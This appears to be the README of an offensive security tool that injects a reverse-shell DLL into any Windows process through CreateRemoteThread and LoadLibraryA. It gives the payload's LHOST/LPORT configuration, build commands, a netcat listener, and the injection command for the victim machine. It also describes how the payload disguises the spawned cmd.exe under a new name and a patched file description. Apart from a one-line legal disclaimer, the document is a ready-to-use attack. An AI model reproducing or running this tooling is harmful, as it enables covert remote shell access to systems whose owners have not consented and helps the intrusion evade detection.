# proc-injection-2 — reverse-shell DLL

**DLL injection via `CreateRemoteThread + LoadLibraryA`** (MITRE ATT&CK T1055.001). The injector allocates a buffer inside the target process, writes this DLL's path into it, then starts a remote thread at `kernel32!LoadLibraryA` with that path as its argument — the target's own loader does the work. Once loaded, the DLL spawns a thread that opens a TCP socket to the attacker, copies `C:\Windows\System32\cmd.exe` next to the target EXE, patches its `FileDescription`, and starts the renamed `cmd.exe` with the socket as stdin/stdout. You get an interactive shell as the target's user.

```
revshell_pure_dll.cpp    DLL source (the reverse-shell payload)
revshell_pure_dll.dll    pre-built x64 DLL (LHOST = 192.168.68.101, LPORT = 4444)
pop.cpp                  injector source
pop.exe                  pre-built x64 injector (loads the DLL into any target)
```

## Config

Edit the top of `revshell_pure_dll.cpp` and rebuild:

```cpp
static const char*    LHOST                = "192.168.68.101";
static const int      LPORT                = 4444;
static const char*    CHILD_EXE_NAME       = "revShell.exe";
static const wchar_t* DESCRIPTION_OVERRIDE = L"RevShell - WinCmd Proc";
```

## Build

**Windows** (x64 Native Tools Command Prompt for VS 2022):

```
cl /LD /EHsc /O2 /nologo revshell_pure_dll.cpp /link ws2_32.lib /OUT:revshell_pure_dll.dll
```

**Linux** (one-liner — installs cross-compiler if missing, then builds):

```bash
sudo apt install -y mingw-w64 && x86_64-w64-mingw32-g++ -shared -O2 -s -o revshell_pure_dll.dll revshell_pure_dll.cpp -lws2_32 -Wl,--subsystem,windows,--kill-at
```

## Use

```bash
# Attacker
nc -lvnp 4444
```

```powershell
# Victim — inject into any x64 process (both files live in this folder)
pop.exe <target_name_or_pid> --dll revshell_pure_dll.dll
```

Shell lands on the listener.

## Legal

Authorized testing only. Running against systems you don't own or weren't given explicit permission to test is a crime in most jurisdictions.
